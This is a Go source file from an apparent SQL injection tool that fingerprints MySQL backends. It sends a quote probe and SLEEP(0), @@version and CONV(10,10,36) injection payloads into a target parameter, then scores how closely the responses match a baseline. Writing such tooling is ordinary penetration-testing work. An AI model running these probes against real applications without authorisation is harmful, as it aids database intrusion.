package fingerprint

import (
	"context"

	"github.com/0x6d61/sqleech/internal/detector"
)

// MySQLFingerprinter identifies MySQL backends through behavioural probing.
type MySQLFingerprinter struct{}

// DBMS returns the name of the target DBMS.
func (m *MySQLFingerprinter) DBMS() string {
	return "MySQL"
}

// Fingerprint performs multiple checks to identify a MySQL backend:
//  1. Error signatures - looks for MySQL-specific error patterns in a quote probe
//  2. Behavioral test  - SLEEP(0) accepted (MySQL-specific function)
//  3. Syntax test      - @@version system variable (MySQL-specific)
//  4. Math test        - CONV(10,10,36)='a' (MySQL-specific function)
//
// Confidence scoring:
//   - Error signature match: 0.7
//   - SLEEP(0) accepted:     +0.1
//   - @@version works:       +0.1
//   - CONV test works:       +0.1
func (m *MySQLFingerprinter) Fingerprint(ctx context.Context, req *FingerprintRequest) (*FingerprintResult, error) {
	result := &FingerprintResult{
		DBMS: "MySQL",
	}

	var confidence float64

	// --- Check 1: Error signatures via a quote probe ---
	quotePayload := req.Parameter.Value + "'"
	quoteResp, err := sendProbe(ctx, req.Client, req.Target, req.Parameter, quotePayload)
	if err != nil {
		return nil, err
	}

	sqlErrors := detector.FindSQLErrors(quoteResp.Body)
	if matches, ok := sqlErrors["MySQL"]; ok && len(matches) > 0 {
		confidence += 0.7
	}

	// --- Check 2: SLEEP(0) behavioral test ---
	sleepPayload := req.Parameter.Value + " AND SLEEP(0)-- -"
	sleepResp, err := sendProbe(ctx, req.Client, req.Target, req.Parameter, sleepPayload)
	if err != nil {
		return nil, err
	}

	if responseSimilar(req.Baseline, sleepResp) {
		confidence += 0.1
	}

	// --- Check 3: @@version syntax test ---
	versionPayload := req.Parameter.Value + " AND @@version IS NOT NULL-- -"
	versionResp, err := sendProbe(ctx, req.Client, req.Target, req.Parameter, versionPayload)
	if err != nil {
		return nil, err
	}

	if responseSimilar(req.Baseline, versionResp) {
		confidence += 0.1
	}

	// --- Check 4: CONV function test (MySQL-specific) ---
	convPayload := req.Parameter.Value + " AND CONV(10,10,36)='a'-- -"
	convResp, err := sendProbe(ctx, req.Client, req.Target, req.Parameter, convPayload)
	if err != nil {
		return nil, err
	}

	if responseSimilar(req.Baseline, convResp) {
		confidence += 0.1
	}

	// Cap confidence at 1.0
	if confidence > 1.0 {
		confidence = 1.0
	}

	result.Confidence = confidence
	result.Identified = confidence >= 0.7

	return result, nil
}
